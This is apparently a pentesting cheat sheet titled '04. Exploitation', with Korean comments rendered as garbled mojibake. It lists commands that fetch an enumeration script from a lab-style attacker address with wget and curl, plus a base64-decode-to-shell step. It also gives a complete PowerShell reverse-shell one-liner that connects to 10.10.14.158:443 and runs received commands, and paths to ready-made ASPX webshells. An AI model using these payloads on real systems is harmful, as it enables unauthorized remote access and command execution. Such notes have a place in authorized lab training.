# 04. Exploitation

---

## ğŸ“ File Transfer

ê³µê²© ëŒ€ìƒ ì‹œìŠ¤í…œìœ¼ë¡œ íŒŒì¼ì„ ì „ì†¡í•˜ëŠ” ë‹¤ì–‘í•œ ë°©ë²•ì…ë‹ˆë‹¤.

```bash
# wgetì„ ì´ìš©í•œ ë‹¤ìš´ë¡œë“œ
wget http://10.10.14.1:8000/linenum.sh

# curlì„ ì´ìš©í•œ ë‹¤ìš´ë¡œë“œ (ì¶œë ¥ íŒŒì¼ëª… ì§€ì •)
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

# SCPë¥¼ ì´ìš©í•œ ë³´ì•ˆ ì „ì†¡
scp linenum.sh user@remotehost:/tmp/linenum.sh

# Base64 ì¸ì½”ë”©ëœ íŒŒì¼ ë””ì½”ë”©
echo <base64 encoded file> | base64 -d > shell
```

> **Tip**: Base64 ì¸ì½”ë”© ë°©ì‹ì€ ë°”ì´ë„ˆë¦¬ íŒŒì¼ì„ í…ìŠ¤íŠ¸ë¡œ ì „ì†¡í•  ë•Œ ìœ ìš©í•©ë‹ˆë‹¤.

---

## ğŸ”« Payload

### Powershell One-liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### aspx webshell location
```bash
# add ip address
/usr/share/laudanum/aspx/shell.aspx

# change username and password
/usr/share/nishang/Antak-WebShell/antak.aspx
```
